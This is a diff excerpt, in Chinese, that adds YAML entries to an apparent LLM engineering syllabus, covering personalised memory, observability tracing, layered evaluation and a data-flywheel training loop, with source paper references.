+  - 实现‘千人千面’：从显式反馈/隐式行为中抽取用户画像标签，构建动态画像向量，结合 RAG 召回个人相关记忆，通过提示词注入或 LoRA 微调实现风格、偏好、知识水平的深度对齐。
+  - 解决长期记忆中的矛盾与过时：设计新旧知识冲突检测（矛盾度打分）、版本化知识库、信念修正链（CoT 验证）、用户确认回环机制，保证记忆系统随时间演化的逻辑一致性与事实准确性。
+- 'no': 11
+  name: 可观测性、评测与数据飞轮 —— 让 AI 系统可看、可测、可优化
+  points:
+  - 全链路可观测性：标准化 Trace 格式（输入/输出/Token/延迟/错误），嵌套 Span 记录 Chain/Agent/Tool/RAG 每步执行细节，支持成本核算、瓶颈定位、异常告警与复现调试
+  - 分层评测体系：单元级组件测试、系统级 RAGAS/MT-Bench 离线基准、业务级在线 A/B 测试（用户留存/任务完成率），建立指标体系与自动化回归流水线
+  - 数据飞轮架构：高质量轨迹采样 -> 专家/模型标注 -> 偏好数据构建 (SFT/DPO) -> 模型迭代 -> 灰度发布 -> 线上收集，实现‘用得越多、懂得越多’的规模化自我进化闭环
+  sources:
+  - paper: 20230418_105.md
+    role: origin
+  - paper: 20230418_109.md
+    role: improve
+  - paper: 20230418_136.md
+    role: improve
+  - paper: 20230418_140.md
+    role: improve
+  excerpts:
+  - 实现 LLM 应用的‘显微镜’：标准化 Trace 格式（输入/输出/Token/延迟/错误），嵌套 Span 记录 Chain/Agent/Tool/RAG
+    每一步执行细节，支持成本核算、瓶颈定位、异常告警与复现调试。
+  - 构建金字塔评测策略：单元级（Prompt/Tool/Retriever 组件测试）、系统级（RAGAS/MT-Bench 离线基准）、业务级（在线 A/B
+    测试、用户留存/任务完成率），建立指标体系与自动化回归流水线。
+  - 设计数据飞轮核心管道：高质量轨迹采样 -> 专家/模型标注 -> 偏好数据构建 (SFT/DPO) -> 模型迭代 -> 灰度发布 -> 线上收集，实现‘用得越多、懂得越多’的规模化自我进化闭环。
+'no': 9
